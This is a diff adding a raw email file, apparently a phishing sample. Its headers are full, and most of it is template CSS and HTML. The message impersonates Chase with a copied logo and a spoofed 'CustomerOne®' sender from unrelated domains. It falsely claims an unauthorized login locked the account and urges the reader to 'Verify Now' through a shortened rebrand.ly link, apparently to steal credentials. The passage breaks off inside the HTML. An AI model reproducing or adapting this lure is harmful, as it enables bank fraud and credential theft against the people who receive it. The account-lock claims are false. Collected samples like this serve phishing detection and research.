@@ -1,0 +1,979 @@
+From jose@monkey.org Fri May 26 13:23:12 2023 +0000
+Return-Path: layna@snapgirls.tv
+Delivered-To: jose@monkey.org
+X-FDA: 80832472224.04.64EB1F4
+Received: from mail.nudiez.tv (mail.nudiez.tv [208.67.181.242])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id B8776120005
+	for <jose@monkey.org>; Fri, 26 May 2023 13:23:10 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf29.b.hostedemail.com: domain of layna@snapgirls.tv designates 208.67.181.242 as permitted sender) smtp.mailfrom=layna@snapgirls.tv;
+	dmarc=pass (policy=none) header.from=snapgirls.tv
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1685107391;
+	h=from:from:sender:reply-to:subject:subject:date:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:in-reply-to:references;
+	bh=vsTohPK0vVMUojlyQqg3FkvDyuBxotzTcwhxyvUYPOY=;
+	b=uD7HSO824ST9T86MoOg3EipjRaKwX4TM4DDWFAqSYfx3/FWb9FaL2bsLjwSOnHp+9b4ql7
+	pVDMZ+L//wLv29w5huXHClCdvLV5dmr/NBBZ4ZHggN26YgCpjN35MI9+/fhJsaZpTvr9C/
+	dTk4BlVvQEVezI4s56//F5CHCTcANxI=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1685107391; a=rsa-sha256;
+	cv=none;
+	b=eJEv1uw5Tzp2eBKFBJvx+SWWQwAz4LD1OonFVdVTxydAvdXNJbCrRvbzY+3f/wsYxrJWxi
+	749Z28wIXCOtX7TL4pjni2QWwlvpiVZue7UX4Gp3UILf1EnFpISi8bX+IGMsEOwne0vbuX
+	HmyeeOrt3M8eyDH3qFRNZGHT4jYCROU=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf29.b.hostedemail.com: domain of layna@snapgirls.tv designates 208.67.181.242 as permitted sender) smtp.mailfrom=layna@snapgirls.tv;
+	dmarc=pass (policy=none) header.from=snapgirls.tv
+Received: from [191.96.150.146] (port=56549 helo=[10.37.18.37])
+	by mail.nudiez.tv with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <layna@snapgirls.tv>)
+	id 1q2XPU-0000cE-2v
+	for jose@monkey.org;
+	Fri, 26 May 2023 06:23:09 -0700
+Content-Type: multipart/alternative; boundary="----=_Boundary_23957_572305474.1554890597258"
+MIME-Version: 1.0
+From: =?utf-8?q?CustomerOne=C2=AE?= <layna@snapgirls.tv>
+To: jose <jose@monkey.org>
+Subject: Alert: Action Required!
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - mail.nudiez.tv
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - snapgirls.tv
+X-Get-Message-Sender-Via: mail.nudiez.tv: authenticated_id: layna@snapgirls.tv
+X-Authenticated-Sender: mail.nudiez.tv: layna@snapgirls.tv
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: B8776120005
+X-Stat-Signature: u7jeht4g5xp9gwafds8pyas5rfa1fe7r
+X-Rspam-User: 
+X-Spam-Status: No, score=6.60
+X-HE-Tag: 1685107390-780699
+X-HE-Meta: U2FsdGVkX1/yEtdFTdbpR/EoyjKLPVVZYQE22L5/gF/KSUg4L7kpHiWBxDMJWhwZgmRihWYXjWVcBCv9kByOgKNXDn98KoQtbgPkKXc9SURhH4999y4gyaowC/fX0Zc3xCC913xRLwwiQK7tT/CwmAc2FzUj0a1fe+j3I7ssk1fMM2uZO0jYmPQAXImesMQcTxuugBRwoQZHO5uRj3oteZ6671GUFiCZLrMmdsI21CzZbydyzB+q3TqUM4k27E8J4/ZQHLGGKC2EqSNbgk+gk/VmWt24coq3YWyS8QAFyTk3ukhddHW9BcGOsXzmETWNBUIcq7IV+A/jNAVst0VtBtI5hJ3wnv3Wnf6d3gfr53oN0JOCG120x6Bm0LA4S8wa6Har7PYsOtG/8MBhdD9E1H3SAAlKycPKwOK3zm32rbAjO/lYfZf+j6CuwHUFFC0cWrS2qn3sCqPgOnFJlVRrKjHVW2nxVduMFW5hUXBxwQ6stI+8pAfBI/pMmawmtU6g/d30ZLPBG0Q=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 132
+
+------=_Boundary_23957_572305474.1554890597258
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+
+*|MC:SUBJECT|*Your online account needs verification.Dear customer,
+We just want to let you know that a recent unauthorized login was found in =
+your online account.
+Which is blocked successfully.
+You can't use your account, at the moment. Please Verify and Secure your ac=
+count by following the link:
+
+Verify Now
+
+=C2=A9 2023, online. All Rights Reserved.
+
+------=_Boundary_23957_572305474.1554890597258
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+<!doctype html>
+<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso=
+ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office"><head>
+        <!-- NAME: 1 COLUMN - FULL WIDTH -->
+        <!--[if gte mso 15]>
+        <xml>
+            <o:OfficeDocumentSettings>
+            <o:AllowPNG/>
+            <o:PixelsPerInch>96</o:PixelsPerInch>
+            </o:OfficeDocumentSettings>
+        </xml>
+        <![endif]-->
+        <meta charset=3D"UTF-8">
+        <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+        <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-sc=
+ale=3D1">
+        <title>*|MC:SUBJECT|*</title>
+       =20
+    <style type=3D"text/css">
+		p{
+			margin:10px 0;
+			padding:0;
+		}
+		table{
+			border-collapse:collapse;
+		}
+		h1,h2,h3,h4,h5,h6{
+			display:block;
+			margin:0;
+			padding:0;
+		}
+		img,a img{
+			border:0;
+			height:auto;
+			outline:none;
+			text-decoration:none;
+		}
+		body,#bodyTable,#bodyCell{
+			height:100%;
+			margin:0;
+			padding:0;
+			width:100%;
+		}
+		.mcnPreviewText{
+			display:none !important;
+		}
+		#outlook a{
+			padding:0;
+		}
+		img{
+			-ms-interpolation-mode:bicubic;
+		}
+		table{
+			mso-table-lspace:0pt;
+			mso-table-rspace:0pt;
+		}
+		.ReadMsgBody{
+			width:100%;
+		}
+		.ExternalClass{
+			width:100%;
+		}
+		p,a,li,td,blockquote{
+			mso-line-height-rule:exactly;
+		}
+		a[href^=3Dtel],a[href^=3Dsms]{
+			color:inherit;
+			cursor:default;
+			text-decoration:none;
+		}
+		p,a,li,td,body,table,blockquote{
+			-ms-text-size-adjust:100%;
+			-webkit-text-size-adjust:100%;
+		}
+		.ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.Ext=
+ernalClass span,.ExternalClass font{
+			line-height:100%;
+		}
+		a[x-apple-data-detectors]{
+			color:inherit !important;
+			text-decoration:none !important;
+			font-size:inherit !important;
+			font-family:inherit !important;
+			font-weight:inherit !important;
+			line-height:inherit !important;
+		}
+		.templateContainer{
+			max-width:600px !important;
+		}
+		a.mcnButton{
+			display:block;
+		}
+		.mcnImage,.mcnRetinaImage{
+			vertical-align:bottom;
+		}
+		.mcnTextContent{
+			word-break:break-word;
+		}
+		.mcnTextContent img{
+			height:auto !important;
+		}
+		.mcnDividerBlock{
+			table-layout:fixed !important;
+		}
+	/*
+	@tab Page
+	@section Background Style
+	@tip Set the background color and top border for your email. You may want =
+to choose colors that match your company's branding.
+	*/
+		body,#bodyTable{
+			/*@editable*/background-color:#FAFAFA;
+		}
+	/*
+	@tab Page
+	@section Background Style
+	@tip Set the background color and top border for your email. You may want =
+to choose colors that match your company's branding.
+	*/
+		#bodyCell{
+			/*@editable*/border-top:0;
+		}
+	/*
+	@tab Page
+	@section Heading 1
+	@tip Set the styling for all first-level headings in your emails. These sh=
+ould be the largest of your headings.
+	@style heading 1
+	*/
+		h1{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:26px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Page
+	@section Heading 2
+	@tip Set the styling for all second-level headings in your emails.
+	@style heading 2
+	*/
+		h2{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:22px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Page
+	@section Heading 3
+	@tip Set the styling for all third-level headings in your emails.
+	@style heading 3
+	*/
+		h3{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:20px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Page
+	@section Heading 4
+	@tip Set the styling for all fourth-level headings in your emails. These s=
+hould be the smallest of your headings.
+	@style heading 4
+	*/
+		h4{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:18px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Preheader
+	@section Preheader Style
+	@tip Set the background color and borders for your email's preheader area.
+	*/
+		#templatePreheader{
+			/*@editable*/background-color:#FAFAFA;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:9px;
+			/*@editable*/padding-bottom:9px;
+		}
+	/*
+	@tab Preheader
+	@section Preheader Text
+	@tip Set the styling for your email's preheader text. Choose a size and co=
+lor that is easy to read.
+	*/
+		#templatePreheader .mcnTextContent,#templatePreheader .mcnTextContent p{
+			/*@editable*/color:#656565;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:12px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Preheader
+	@section Preheader Link
+	@tip Set the styling for your email's preheader links. Choose a color that=
+ helps them stand out from your text.
+	*/
+		#templatePreheader .mcnTextContent a,#templatePreheader .mcnTextContent p=
+ a{
+			/*@editable*/color:#656565;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Header
+	@section Header Style
+	@tip Set the background color and borders for your email's header area.
+	*/
+		#templateHeader{
+			/*@editable*/background-color:#FFFFFF;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:9px;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Header
+	@section Header Text
+	@tip Set the styling for your email's header text. Choose a size and color=
+ that is easy to read.
+	*/
+		#templateHeader .mcnTextContent,#templateHeader .mcnTextContent p{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Header
+	@section Header Link
+	@tip Set the styling for your email's header links. Choose a color that he=
+lps them stand out from your text.
+	*/
+		#templateHeader .mcnTextContent a,#templateHeader .mcnTextContent p a{
+			/*@editable*/color:#007C89;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Body
+	@section Body Style
+	@tip Set the background color and borders for your email's body area.
+	*/
+		#templateBody{
+			/*@editable*/background-color:#FFFFFF;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:9px;
+			/*@editable*/padding-bottom:9px;
+		}
+	/*
+	@tab Body
+	@section Body Text
+	@tip Set the styling for your email's body text. Choose a size and color t=
+hat is easy to read.
+	*/
+		#templateBody .mcnTextContent,#templateBody .mcnTextContent p{
+			/*@editable*/color:#202020;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Body
+	@section Body Link
+	@tip Set the styling for your email's body links. Choose a color that help=
+s them stand out from your text.
+	*/
+		#templateBody .mcnTextContent a,#templateBody .mcnTextContent p a{
+			/*@editable*/color:#007C89;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Footer
+	@section Footer Style
+	@tip Set the background color and borders for your email's footer area.
+	*/
+		#templateFooter{
+			/*@editable*/background-color:#FAFAFA;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:9px;
+			/*@editable*/padding-bottom:9px;
+		}
+	/*
+	@tab Footer
+	@section Footer Text
+	@tip Set the styling for your email's footer text. Choose a size and color=
+ that is easy to read.
+	*/
+		#templateFooter .mcnTextContent,#templateFooter .mcnTextContent p{
+			/*@editable*/color:#656565;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:12px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Footer
+	@section Footer Link
+	@tip Set the styling for your email's footer links. Choose a color that he=
+lps them stand out from your text.
+	*/
+		#templateFooter .mcnTextContent a,#templateFooter .mcnTextContent p a{
+			/*@editable*/color:#656565;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	@media only screen and (min-width:768px){
+		.templateContainer{
+			width:600px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body,table,td,p,a,li,blockquote{
+			-webkit-text-size-adjust:none !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body{
+			width:100% !important;
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnRetinaImage{
+			max-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImage{
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCapti=
+onBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcn=
+ImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionR=
+ightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRi=
+ghtImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCar=
+dRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImage=
+CardRightImageContentContainer{
+			max-width:100% !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnBoxedTextContentContainer{
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupContent{
+			padding:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter =
+.mcnTextContent{
+			padding-top:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCapt=
+ionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-chil=
+d .mcnTextContent{
+			padding-top:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardBottomImageContent{
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockInner{
+			padding-top:0 !important;
+			padding-bottom:0 !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockOuter{
+			padding-top:9px !important;
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnTextContent,.mcnBoxedTextContentColumn{
+			padding-right:18px !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
+			padding-right:18px !important;
+			padding-bottom:0 !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcpreview-image-uploader{
+			display:none !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 1
+	@tip Make the first-level headings larger in size for better readability o=
+n small screens.
+	*/
+		h1{
+			/*@editable*/font-size:22px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 2
+	@tip Make the second-level headings larger in size for better readability =
+on small screens.
+	*/
+		h2{
+			/*@editable*/font-size:20px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 3
+	@tip Make the third-level headings larger in size for better readability o=
+n small screens.
+	*/
+		h3{
+			/*@editable*/font-size:18px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 4
+	@tip Make the fourth-level headings larger in size for better readability =
+on small screens.
+	*/
+		h4{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Boxed Text
+	@tip Make the boxed text larger in size for better readability on small sc=
+reens. We recommend a font size of at least 16px.
+	*/
+		.mcnBoxedTextContentContainer .mcnTextContent,.mcnBoxedTextContentContain=
+er .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Preheader Visibility
+	@tip Set the visibility of the email's preheader on small screens. You can=
+ hide it to save space.
+	*/
+		#templatePreheader{
+			/*@editable*/display:block !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Preheader Text
+	@tip Make the preheader text larger in size for better readability on smal=
+l screens.
+	*/
+		#templatePreheader .mcnTextContent,#templatePreheader .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Header Text
+	@tip Make the header text larger in size for better readability on small s=
+creens.
+	*/
+		#templateHeader .mcnTextContent,#templateHeader .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Body Text
+	@tip Make the body text larger in size for better readability on small scr=
+eens. We recommend a font size of at least 16px.
+	*/
+		#templateBody .mcnTextContent,#templateBody .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Footer Text
+	@tip Make the footer content text larger in size for better readability on=
+ small screens.
+	*/
+		#templateFooter .mcnTextContent,#templateFooter .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}</style></head>
+    <body>
+     =20
+        <center>
+            <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspac=
+ing=3D"0" height=3D"100%" width=3D"100%" id=3D"bodyTable">
+                <tbody><tr>
+                    <td align=3D"center" valign=3D"top" id=3D"bodyCell">
+                        <!-- BEGIN TEMPLATE // -->
+                        <table border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" width=3D"100%">
+                            <tbody><tr>
+                                <td align=3D"center" valign=3D"top" id=3D"t=
+emplatePreheader">
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    <table align=3D"center" border=3D"0" ce=
+llspacing=3D"0" cellpadding=3D"0" width=3D"600" style=3D"width:600px;">
+                                    <tr>
+                                    <td align=3D"center" valign=3D"top" wid=
+th=3D"600" style=3D"width:600px;">
+                                    <![endif]-->
+                                    <table align=3D"center" border=3D"0" ce=
+llpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"templateContainer=
+">
+                                        <tbody><tr>
+                                            <td valign=3D"top" class=3D"pre=
+headerContainer"><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" wi=
+dth=3D"100%" class=3D"mcnImageBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnImageBlockOuter">
+            <tr>
+                <td valign=3D"top" style=3D"padding:9px" class=3D"mcnImageB=
+lockInner">
+                    <table align=3D"left" width=3D"100%" border=3D"0" cellp=
+adding=3D"0" cellspacing=3D"0" class=3D"mcnImageContentContainer" style=3D"=
+min-width:100%;">
+                        <tbody><tr>
+                            <td class=3D"mcnImageContent" valign=3D"top" st=
+yle=3D"padding-right: 9px; padding-left: 9px; padding-top: 0; padding-botto=
+m: 0;">
+                               =20
+                                   =20
+                                        <img align=3D"left" alt=3D"" src=3D=
+"https://upload.wikimedia.org/wikipedia/commons/e/ed/Chase_logo_2007.svg" w=
+idth=3D"442.1" style=3D"max-width:455px; padding-bottom: 0; display: inline=
+ !important; vertical-align: bottom;" class=3D"mcnImage">
+                                   =20
+                               =20
+                            </td>
+                        </tr>
+                    </tbody></table>
+                </td>
+            </tr>
+    </tbody>
+</table></td>
+                                        </tr>
+                                    </tbody></table>
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    </td>
+                                    </tr>
+                                    </table>
+                                    <![endif]-->
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align=3D"center" valign=3D"top" id=3D"t=
+emplateHeader">
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    <table align=3D"center" border=3D"0" ce=
+llspacing=3D"0" cellpadding=3D"0" width=3D"600" style=3D"width:600px;">
+                                    <tr>
+                                    <td align=3D"center" valign=3D"top" wid=
+th=3D"600" style=3D"width:600px;">
+                                    <![endif]-->
+                                    <table align=3D"center" border=3D"0" ce=
+llpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"templateContainer=
+">
+                                        <tbody><tr>
+                                            <td valign=3D"top" class=3D"hea=
+derContainer"><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"100%" class=3D"mcnDividerBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnDividerBlockOuter">
+        <tr>
+            <td class=3D"mcnDividerBlockInner" style=3D"min-width: 100%; pa=
+dding: 1px 18px;">
+                <table class=3D"mcnDividerContent" border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" width=3D"100%" style=3D"min-width: 100%;border-top=
+: 2px solid #EAEAEA;">
+                    <tbody><tr>
+                        <td>
+                            <span></span>
+                        </td>
+                    </tr>
+                </tbody></table>
+<!--           =20
+                <td class=3D"mcnDividerBlockInner" style=3D"padding: 18px;">
+                <hr class=3D"mcnDividerContent" style=3D"border-bottom-colo=
+r:none; border-left-color:none; border-right-color:none; border-bottom-widt=
+h:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:=
+0; margin-bottom:0; margin-left:0;" />
+-->
+            </td>
+        </tr>
+    </tbody>
+</table><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"10=
+0%" class=3D"mcnTextBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td valign=3D"top" class=3D"mcnTextBlockInner" style=3D"padding=
+-top:9px;">
+              	<!--[if mso]>
+				<table align=3D"left" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"100%" style=3D"width:100%;">
+				<tr>
+				<![endif]-->
+			   =20
+				<!--[if mso]>
+				<td valign=3D"top" width=3D"600" style=3D"width:600px;">
+				<![endif]-->
+                <table align=3D"left" border=3D"0" cellpadding=3D"0" cellsp=
+acing=3D"0" style=3D"max-width:100%; min-width:100%;" width=3D"100%" class=
+=3D"mcnTextContentContainer">
+                    <tbody><tr>
+                       =20
+                        <td valign=3D"top" class=3D"mcnTextContent" style=
+=3D"padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18p=
+x;">
+                       =20
+                            <strong>Your online account needs verification.=
+</strong>
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+               =20
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"10=
+0%" class=3D"mcnTextBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td valign=3D"top" class=3D"mcnTextBlockInner" style=3D"padding=
+-top:9px;">
+              	<!--[if mso]>
+				<table align=3D"left" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"100%" style=3D"width:100%;">
+				<tr>
+				<![endif]-->
+			   =20
+				<!--[if mso]>
+				<td valign=3D"top" width=3D"600" style=3D"width:600px;">
+				<![endif]-->
+                <table align=3D"left" border=3D"0" cellpadding=3D"0" cellsp=
+acing=3D"0" style=3D"max-width:100%; min-width:100%;" width=3D"100%" class=
+=3D"mcnTextContentContainer">
+                    <tbody><tr>
+                       =20
+                        <td valign=3D"top" class=3D"mcnTextContent" style=
+=3D"padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18p=
+x;">
+                       =20
+                            <h3 class=3D"null"><span style=3D"font-size:12p=
+x">Dear customer,<br>
+We just want to let you know that a recent unauthorized login was found in =
+your online account.<br>
+Which is blocked successfully.<br>
+You can't use your account, at the moment. Please Verify and Secure your ac=
+count by following the link:</span></h3>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+               =20
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"10=
+0%" class=3D"mcnButtonBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnButtonBlockOuter">
+        <tr>
+            <td style=3D"padding-top:0; padding-right:18px; padding-bottom:=
+18px; padding-left:18px;" valign=3D"top" align=3D"center" class=3D"mcnButto=
+nBlockInner">
+                <table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" wid=
+th=3D"100%" class=3D"mcnButtonContentContainer" style=3D"border-collapse: s=
+eparate !important;border-radius: 50px;background-color: #005eb8;">
+                    <tbody>
+                        <tr>
+                            <td align=3D"center" valign=3D"middle" class=3D=
+"mcnButtonContent" style=3D"font-family: Arial; font-size: 13px; padding: 1=
+3px;">
+                                <a class=3D"mcnButton " title=3D"Verify Now=
+" href=3D"https://rebrand.ly/53f82c" target=3D"_blank" style=3D"font-weight=
+: bold;letter-spacing: normal;line-height: 100%;text-align: center;text-dec=
+oration: none;color: #FFFFFF;">Verify Now</a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    </tbody>
+</table><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"10=
+0%" class=3D"mcnTextBlock" style=3D"min-width:100%;">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td valign=3D"top" class=3D"mcnTextBlockInner" style=3D"padding=
+-top:9px;">
+              	<!--[if mso]>
+				<table align=3D"left" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"100%" style=3D"width:100%;">
+				<tr>
+				<![endif]-->
+			   =20
+				<!--[if mso]>
+				<td valign=3D"top" width=3D"600" style=3D"width:600px;">
+				<![endif]-->
+                <table align=3D"left" border=3D"0" cellpadding=3D"0" cellsp=
+acing=3D"0" style=3D"max-width:100%; min-width:100%;" width=3D"100%" class=
+=3D"mcnTextContentContainer">
+                    <tbody><tr>
+                       =20
+                        <td valign=3D"top" class=3D"mcnTextContent" style=
+=3D"padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18p=
+x;">
+                       =20
+                            <h4 class=3D"null"><span style=3D"font-size:12p=
+x">=C2=A9 2023,<br> online. All Rights Reserved.</span></h4>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+               =20
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+                                        </tr>
+                                    </tbody></table>
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    </td>
+                                    </tr>
+                                    </table>
+                                    <![endif]-->
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align=3D"center" valign=3D"top" id=3D"t=
+emplateBody">
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    <table align=3D"center" border=3D"0" ce=
+llspacing=3D"0" cellpadding=3D"0" width=3D"600" style=3D"width:600px;">
+                                    <tr>
